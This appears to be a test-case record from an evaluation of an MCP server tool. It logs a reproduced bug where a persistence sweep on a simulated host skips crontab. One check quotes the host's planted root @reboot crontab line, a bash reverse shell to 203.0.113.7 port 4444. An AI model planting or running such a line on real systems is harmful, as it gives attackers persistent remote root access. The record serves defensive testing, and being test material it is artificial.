@@ -1,0 +1,40 @@
+{
+  "case_id": "P2049-151",
+  "problem": "P2049",
+  "server": "trudi",
+  "commit": "88fbca78186b6a0ca40423cf5e37a9dc46ae051e",
+  "display": "multi-call",
+  "level": "mcp",
+  "realism": "common",
+  "coverage": "partial: the live host is simulated (ssh, systemctl, lsmod, crontab are stubs in their real output formats, and files such as /etc/profile.d are the container's own); the lsmod | head -50 cut is not shown",
+  "result": "reproduced",
+  "reproduced_runs": "1/1",
+  "checks": [
+    {
+      "step": 2,
+      "note_ko": "지속성 훑기는 성공 응답이다",
+      "contains": "\"success\": true",
+      "ok": true
+    },
+    {
+      "step": 2,
+      "note_ko": "응답 구역은 systemd 다음에 바로 rc.local·profile.d·.bashrc·lsmod로 이어지고 crontab 구역이 없다",
+      "regex": "===SYSTEMD_TIMERS===.*===RC_LOCAL===.*===PROFILE_D===.*===BASHRC_TAIL===.*===LSMOD===",
+      "ok": true
+    },
+    {
+      "step": 2,
+      "note_ko": "지속성 훑기 명령에 crontab이나 cron 경로가 없다",
+      "not_regex": "(?i)cron(tab|\\.d|\\.daily|_d)",
+      "ok": true
+    },
+    {
+      "step": 3,
+      "note_ko": "같은 호스트의 예약 작업에는 root의 @reboot 리버스 셸이 있다",
+      "contains": "@reboot /bin/bash -c 'sleep 30; bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'",
+      "ok": true
+    }
+  ],
+  "image": "sha256:2ae389e4bcf8577f4760ac25a89002e2fe304ea3218ef2698621dcdf07583fd4",
+  "ran_at": "2026-11-27T20:05:35+00:00"
+}
